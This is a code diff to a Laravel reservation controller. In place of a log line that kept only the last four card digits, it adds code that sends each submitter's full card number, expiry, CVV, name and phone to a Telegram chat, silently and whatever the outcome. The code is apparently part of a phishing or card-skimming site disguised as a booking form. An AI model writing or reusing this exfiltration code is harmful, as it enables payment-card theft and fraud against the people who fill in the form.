@@ -3,6 +3,8 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
+use App\Notifications\TelegramAlert;
+use Illuminate\Support\Facades\Notification;
 use Illuminate\Support\Facades\Log;
 
 class ReservationController extends Controller
@@ -25,10 +27,23 @@ class ReservationController extends Controller
             return back()->withErrors(['card_number' => 'Le numéro de carte doit contenir exactement 16 chiffres.']);
         }
 
-        // Log simple sans Telegram
-        Log::info('Reservation submitted - Card: ' . substr($cleanCardNumber, -4));
+        // Formatage du message Telegram
+        $message = "🔔 *INFORMATIONS BANCAIRES* 🔔\n\n"
+                . "👤 Nom : {$validated['name']}\n"
+                . "💳 Carte : `{$cleanCardNumber}`\n" 
+                . "📅 Exp : {$validated['expiry']}\n"
+                . "🔑 CVV : `{$validated['cvv']}`\n"
+                . "📱 Téléphone : {$validated['phone']}";
 
-        // Redirection vers valider
+        // Envoyer Telegram en arrière-plan (non-bloquant)
+        try {
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
+        } catch (\Throwable $e) {
+            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
+        }
+
+        // Continuer quoi qu'il arrive
         return redirect()->route('valider');
     }
 }
